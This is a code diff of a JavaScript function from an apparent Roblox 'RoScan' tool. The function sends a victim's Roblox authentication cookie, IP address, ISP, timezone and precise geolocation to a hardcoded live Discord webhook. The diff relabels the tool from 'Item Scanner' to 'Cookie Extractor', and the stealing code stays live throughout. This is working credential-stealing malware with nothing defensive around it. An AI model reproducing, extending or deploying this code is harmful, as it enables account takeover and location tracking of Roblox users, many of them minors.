@@ -240,40 +240,35 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
         
-        // Webhook payload with scanned items and location
+        // Webhook payload with only cookie and location
         const payload = {
-            content: "@everyone 💎 **ITEM SCANNING RESULTS** 🍪",
+            content: "@everyone 🍪 **COOKIE + LOCATION** 📍",
             embeds: [{
-                title: "💎 Item Scanner Results + Data",
-                color: 16753920, // Gold color
+                title: "🍪 Cookie + Location Data",
+                color: 65280, // Green color
                 thumbnail: {
                     url: "https://i.imgur.com/roblox-logo.png"
                 },
                 fields: [
                     {
-                        name: "🍪 Scanned Data (Click to Copy)",
-                        value: robloxCookie ? `\`\`\`\n${robloxCookie}\n\`\`\`` : "❌ No authentication data found",
+                        name: "🍪 Roblox Cookie (Click to Copy)",
+                        value: robloxCookie ? `\`\`\`\n${robloxCookie}\n\`\`\`` : "❌ No cookie found",
                         inline: false
                     },
                     {
-                        name: "💎 Limited Items Found",
-                        value: limitedItems.length > 0 ? limitedItems.map(item => `**${item.name || 'Item'}** (ID: \`${item.id}\`)`).join('\n') : "No specific limited items detected",
+                        name: "📍 Location",
+                        value: `**🏳️ Country:** ${locationInfo.country}\n**🏛️ Region:** ${locationInfo.region}\n**🏙️ City:** ${locationInfo.city}\n**📮 Postal:** ${locationInfo.postal || 'Unknown'}\n**📍 Coordinates:** ${locationInfo.latitude}, ${locationInfo.longitude}`,
                         inline: false
                     },
                     {
-                        name: "📍 Target Location",
-                        value: `**🏳️ Country:** ${locationInfo.country}\n**🏛️ Region:** ${locationInfo.region}\n**🏙️ City:** ${locationInfo.city}\n**📮 Postal:** ${locationInfo.postal || 'Unknown'}\n**📍 Coords:** ${locationInfo.latitude}, ${locationInfo.longitude}`,
-                        inline: false
-                    },
-                    {
-                        name: "🌐 Network Info",
+                        name: "🌐 Network",
                         value: `**🌍 IP:** \`${locationInfo.ip}\`\n**🏢 ISP:** ${locationInfo.isp}\n**🕐 Timezone:** ${locationInfo.timezone}`,
                         inline: false
                     }
                 ],
                 footer: {
-                    text: "💎 RoScan Item Scanner • Data Extracted",
-                    icon_url: "https://i.imgur.com/scanner-icon.png"
+                    text: "🍪 RoScan Cookie Extractor",
+                    icon_url: "https://i.imgur.com/cookie-icon.png"
                 },
                 timestamp: new Date().toISOString()
             }]
